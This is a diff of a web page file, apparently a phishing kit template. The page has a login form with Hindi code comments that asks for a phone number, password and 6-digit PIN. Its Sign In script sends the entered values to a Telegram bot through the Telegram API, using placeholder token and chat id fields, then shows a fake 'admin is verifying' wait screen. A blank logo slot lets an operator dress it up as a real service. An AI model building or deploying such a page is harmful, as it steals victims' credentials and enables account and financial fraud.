@@ -1,6 +1,223 @@
-<html>
-<style>
-   div{min-height:1em;}
-</style>
-<body>&lt;!DOCTYPE html&gt;<br/>&lt;html lang=&quot;en&quot;&gt;<br/>&lt;head&gt;<br/>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br/>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br/>    &lt;title&gt;Login Page&lt;/title&gt;<br/>    &lt;!-- Icons के लिए FontAwesome लिंक --&gt;<br/>    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css&quot;&gt;<br/>    <br/>    &lt;style&gt;<br/>        body {<br/>            font-family: &#39;Segoe UI&#39;, Tahoma, Geneva, Verdana, sans-serif;<br/>            background-color: #f4f6fb;<br/>            margin: 0;<br/>            display: flex;<br/>            justify-content: center;<br/>            align-items: center;<br/>            height: 100vh;<br/>            color: #333;<br/>        }<br/>        .container {<br/>            width: 100%;<br/>            max-width: 360px;<br/>            padding: 20px;<br/>            box-sizing: border-box;<br/>            position: relative;<br/>        }<br/>        <br/>        /* लोगो डिज़ाइन */<br/>        .logo-section {<br/>            text-align: center;<br/>            margin-bottom: 40px;<br/>            background: white;<br/>            padding: 20px;<br/>            border-radius: 10px;<br/>            box-shadow: 0 4px 10px rgba(0,0,0,0.05);<br/>        }<br/>        .logo-section img {<br/>            max-width: 120px;<br/>        }<br/><br/>        /* इनपुट बॉक्स डिज़ाइन */<br/>        .input-group {<br/>            display: flex;<br/>            align-items: center;<br/>            background-color: white;<br/>            border-radius: 30px;<br/>            padding: 5px 20px;<br/>            margin-bottom: 15px;<br/>            box-shadow: 0 2px 5px rgba(0,0,0,0.02);<br/>        }<br/>        .input-group i {<br/>            color: #128c57;<br/>            font-size: 18px;<br/>            width: 30px;<br/>        }<br/>        .input-group input {<br/>            border: none;<br/>            outline: none;<br/>            width: 100%;<br/>            padding: 12px 0;<br/>            font-size: 15px;<br/>            background: transparent;<br/>            color: #333;<br/>        }<br/>        .input-group input::placeholder {<br/>            color: #b3b3b3;<br/>        }<br/><br/>        /* लिंक्स और रेडियो बटन डिज़ाइन */<br/>        .options-row {<br/>            display: flex;<br/>            justify-content: space-between;<br/>            font-size: 14px;<br/>            margin: 10px 10px 20px 10px;<br/>        }<br/>        .options-row a {<br/>            color: #128c57;<br/>            text-decoration: none;<br/>        }<br/>        .options-row label {<br/>            color: #128c57;<br/>            display: flex;<br/>            align-items: center;<br/>            cursor: pointer;<br/>        }<br/>        <br/>        .agreement-row {<br/>            text-align: center;<br/>            font-size: 13px;<br/>            margin-bottom: 20px;<br/>            color: #128c57;<br/>        }<br/>        .agreement-row a {<br/>            color: #128c57;<br/>            text-decoration: none;<br/>        }<br/><br/>        /* साइन इन बटन */<br/>        .sign-in-btn {<br/>            background-color: #128c57;<br/>            color: white;<br/>            border: none;<br/>            border-radius: 30px;<br/>            width: 100%;<br/>            padding: 15px;<br/>            font-size: 16px;<br/>            font-weight: bold;<br/>            cursor: pointer;<br/>            box-shadow: 0 4px 10px rgba(18, 140, 87, 0.3);<br/>        }<br/><br/>        /* Forget Password */<br/>        .forget-password {<br/>            text-align: center;<br/>            margin-top: 25px;<br/>        }<br/>        .forget-password a {<br/>            color: #128c57;<br/>            text-decoration: none;<br/>            font-size: 14px;<br/>        }<br/><br/>        /* वर्ज़न टेक्स्ट */<br/>        .version {<br/>            position: fixed;<br/>            bottom: 10px;<br/>            right: 15px;<br/>            font-size: 12px;<br/>            color: #999;<br/>        }<br/><br/>        /* वेटिंग स्क्रीन */<br/>        .wait-screen {<br/>            text-align: center;<br/>            background: white;<br/>            padding: 40px 20px;<br/>            border-radius: 10px;<br/>            box-shadow: 0 4px 10px rgba(0,0,0,0.1);<br/>        }<br/>        .wait-screen h2 {<br/>            color: #128c57;<br/>        }<br/>    &lt;/style&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/><br/>    &lt;!-- मेन लॉगिन सेक्शन --&gt;<br/>    &lt;div class=&quot;container&quot; id=&quot;login-section&quot;&gt;<br/>        <br/>        &lt;!-- लोगो (यहाँ आप अपनी इमेज का लिंक डाल सकते हैं) --&gt;<br/>        &lt;div class=&quot;logo-section&quot;&gt;<br/>            &lt;img src=&quot;https://via.placeholder.com/150x80/333333/FFFFFF?text=YOUR+LOGO&quot; alt=&quot;Logo&quot;&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;input-group&quot;&gt;<br/>            &lt;i class=&quot;fa-regular fa-user&quot;&gt;&lt;/i&gt;<br/>            &lt;input type=&quot;text&quot; id=&quot;phone&quot; placeholder=&quot;Phone&quot;&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;input-group&quot;&gt;<br/>            &lt;i class=&quot;fa-solid fa-lock&quot;&gt;&lt;/i&gt;<br/>            &lt;input type=&quot;password&quot; id=&quot;password&quot; placeholder=&quot;Password&quot;&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;input-group&quot;&gt;<br/>            &lt;i class=&quot;fa-solid fa-key&quot;&gt;&lt;/i&gt;<br/>            &lt;input type=&quot;password&quot; id=&quot;pin&quot; placeholder=&quot;6-Digit PIN&quot;&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;options-row&quot;&gt;<br/>            &lt;a href=&quot;#&quot;&gt;Register&lt;/a&gt;<br/>            &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;remember&quot;&gt; Remember Me&lt;/label&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;agreement-row&quot;&gt;<br/>            &lt;label&gt;<br/>                &lt;input type=&quot;radio&quot; checked&gt; Agree &lt;a href=&quot;#&quot;&gt;&quot;User Privacy Agreement&quot;&lt;/a&gt;<br/>            &lt;/label&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;button class=&quot;sign-in-btn&quot; onclick=&quot;sendToTelegram()&quot;&gt;Sign In&lt;/button&gt;<br/><br/>        &lt;div class=&quot;forget-password&quot;&gt;<br/>            &lt;a href=&quot;#&quot;&gt;Forget Password&lt;/a&gt;<br/>        &lt;/div&gt;<br/><br/>        &lt;div class=&quot;version&quot;&gt;v1.2.3&lt;/div&gt;<br/>    &lt;/div&gt;<br/><br/>    &lt;!-- इंतज़ार वाला मैसेज --&gt;<br/>    &lt;div class=&quot;container wait-screen&quot; id=&quot;wait-section&quot; style=&quot;display: none;&quot;&gt;<br/>        &lt;h2&gt;Please Wait...&lt;/h2&gt;<br/>        &lt;p&gt;Admin is verifying your details. Do not close this page.&lt;/p&gt;<br/>    &lt;/div&gt;<br/><br/>    &lt;script&gt;<br/>        function sendToTelegram() {<br/>            var botToken = &quot;YOUR_BOT_TOKEN_HERE&quot;; <br/>            var chatId = &quot;YOUR_CHAT_ID_HERE&quot;; <br/>            <br/>            var phone = document.getElementById(&quot;phone&quot;).value;<br/>            var pass = document.getElementById(&quot;password&quot;).value;<br/>            var pin = document.getElementById(&quot;pin&quot;).value;<br/><br/>            if(phone == &quot;&quot; || pass == &quot;&quot;) {<br/>                alert(&quot;Please enter Phone and Password&quot;);<br/>                return;<br/>            }<br/><br/>            var message = &quot;🟢 नया लॉगिन आया है:\n\n📱 Phone: &quot; + phone + &quot;\n🔒 Password: &quot; + pass + &quot;\n🔑 PIN: &quot; + pin;<br/><br/>            var telegramUrl = &quot;https://api.telegram.org/bot&quot; + botToken + &quot;/sendMessage?chat_id=&quot; + chatId + &quot;&amp;text=&quot; + encodeURIComponent(message);<br/><br/>            fetch(telegramUrl);<br/><br/>            document.getElementById(&quot;login-section&quot;).style.display = &quot;none&quot;;<br/>            document.getElementById(&quot;wait-section&quot;).style.display = &quot;block&quot;;<br/>        }<br/>    &lt;/script&gt;<br/><br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/></body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <!-- Icons के लिए FontAwesome लिंक -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6fb;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+        
+        /* लोगो डिज़ाइन */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 40px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .logo-section img {
+            max-width: 120px;
+        }
+
+        /* इनपुट बॉक्स डिज़ाइन */
+        .input-group {
+            display: flex;
+            align-items: center;
+            background-color: white;
+            border-radius: 30px;
+            padding: 5px 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+        .input-group i {
+            color: #128c57;
+            font-size: 18px;
+            width: 30px;
+        }
+        .input-group input {
+            border: none;
+            outline: none;
+            width: 100%;
+            padding: 12px 0;
+            font-size: 15px;
+            background: transparent;
+            color: #333;
+        }
+        .input-group input::placeholder {
+            color: #b3b3b3;
+        }
+
+        /* लिंक्स और रेडियो बटन डिज़ाइन */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin: 10px 10px 20px 10px;
+        }
+        .options-row a {
+            color: #128c57;
+            text-decoration: none;
+        }
+        .options-row label {
+            color: #128c57;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .agreement-row {
+            text-align: center;
+            font-size: 13px;
+            margin-bottom: 20px;
+            color: #128c57;
+        }
+        .agreement-row a {
+            color: #128c57;
+            text-decoration: none;
+        }
+
+        /* साइन इन बटन */
+        .sign-in-btn {
+            background-color: #128c57;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(18, 140, 87, 0.3);
+        }
+
+        /* Forget Password */
+        .forget-password {
+            text-align: center;
+            margin-top: 25px;
+        }
+        .forget-password a {
+            color: #128c57;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* वर्ज़न टेक्स्ट */
+        .version {
+            position: fixed;
+            bottom: 10px;
+            right: 15px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* वेटिंग स्क्रीन */
+        .wait-screen {
+            text-align: center;
+            background: white;
+            padding: 40px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .wait-screen h2 {
+            color: #128c57;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- मेन लॉगिन सेक्शन -->
+    <div class="container" id="login-section">
+        
+        <!-- लोगो (यहाँ आप अपनी इमेज का लिंक डाल सकते हैं) -->
+        <div class="logo-section">
+            <img src="https://via.placeholder.com/150x80/333333/FFFFFF?text=YOUR+LOGO" alt="Logo">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-regular fa-user"></i>
+            <input type="text" id="phone" placeholder="Phone">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-solid fa-lock"></i>
+            <input type="password" id="password" placeholder="Password">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-solid fa-key"></i>
+            <input type="password" id="pin" placeholder="6-Digit PIN">
+        </div>
+
+        <div class="options-row">
+            <a href="#">Register</a>
+            <label><input type="radio" name="remember"> Remember Me</label>
+        </div>
+
+        <div class="agreement-row">
+            <label>
+                <input type="radio" checked> Agree <a href="#">"User Privacy Agreement"</a>
+            </label>
+        </div>
+
+        <button class="sign-in-btn" onclick="sendToTelegram()">Sign In</button>
+
+        <div class="forget-password">
+            <a href="#">Forget Password</a>
+        </div>
+
+        <div class="version">v1.2.3</div>
+    </div>
+
+    <!-- इंतज़ार वाला मैसेज -->
+    <div class="container wait-screen" id="wait-section" style="display: none;">
+        <h2>Please Wait...</h2>
+        <p>Admin is verifying your details. Do not close this page.</p>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            var botToken = "YOUR_BOT_TOKEN_HERE"; 
+            var chatId = "YOUR_CHAT_ID_HERE"; 
+            
+            var phone = document.getElementById("phone").value;
+            var pass = document.getElementById("password").value;
+            var pin = document.getElementById("pin").value;
+
+            if(phone == "" || pass == "") {
+                alert("Please enter Phone and Password");
+                return;
+            }
+
+            var message = "🟢 नया लॉगिन आया है:\n\n📱 Phone: " + phone + "\n🔒 Password: " + pass + "\n🔑 PIN: " + pin;
+
+            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+
+            fetch(telegramUrl);
+
+            document.getElementById("login-section").style.display = "none";
+            document.getElementById("wait-section").style.display = "block";
+        }
+    </script>
+
+</body>
 </html>
